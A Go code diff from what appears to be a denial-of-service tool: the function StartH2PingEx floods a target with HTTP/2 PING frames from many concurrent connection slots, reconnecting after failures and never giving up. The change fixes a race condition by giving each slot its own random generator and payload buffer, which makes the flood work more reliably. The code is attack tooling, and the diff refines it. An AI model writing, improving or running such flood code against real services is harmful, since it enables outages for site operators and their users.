@@ -43,9 +43,6 @@ func StartH2PingEx(cfg AttackConfig) *AttackSession {
 	useTLS := strings.HasPrefix(t0, "https")
 	addr := hostPort(t0)
 
-	// 随机 8 字节 PING 载荷
-	pingData := [8]byte{}
-
 	go func() {
 		var wg sync.WaitGroup
 		dur := time.Duration(cfg.Duration) * time.Second
@@ -54,17 +51,21 @@ func StartH2PingEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int64) {
 				defer wg.Done()
-				rng := NewFastRNG(time.Now().UnixNano() + seed)
 				endTime := time.Now().Add(dur)
 
 				var slotWG sync.WaitGroup
 				for slot := 0; slot < h2PingSlotsPerThread; slot++ {
 					slotWG.Add(1)
-					go func() {
+					go func(slot int) {
 						defer slotWG.Done()
 						tc := newTimeCache()
 						var conn net.Conn
 						var framer *http2.Framer
+						// 每槽独立 RNG 与载荷缓冲：此前共用一个 FastRNG /
+						// pingData 会被同线程的多个槽并发读写（go race 实测命中，
+						// xorshift 状态撕裂导致随机质量下降）
+						rng := NewFastRNG(time.Now().UnixNano() + seed + int64(slot)*7919)
+						var pingData [8]byte
 
 						// 拨号/重连：失败退避，绝不退出
 						ensureConn := func() bool {
@@ -115,7 +116,7 @@ func StartH2PingEx(cfg AttackConfig) *AttackSession {
 						if conn != nil {
 							conn.Close()
 						}
-					}()
+					}(slot)
 				}
 				slotWG.Wait()
 			}(int64(i))
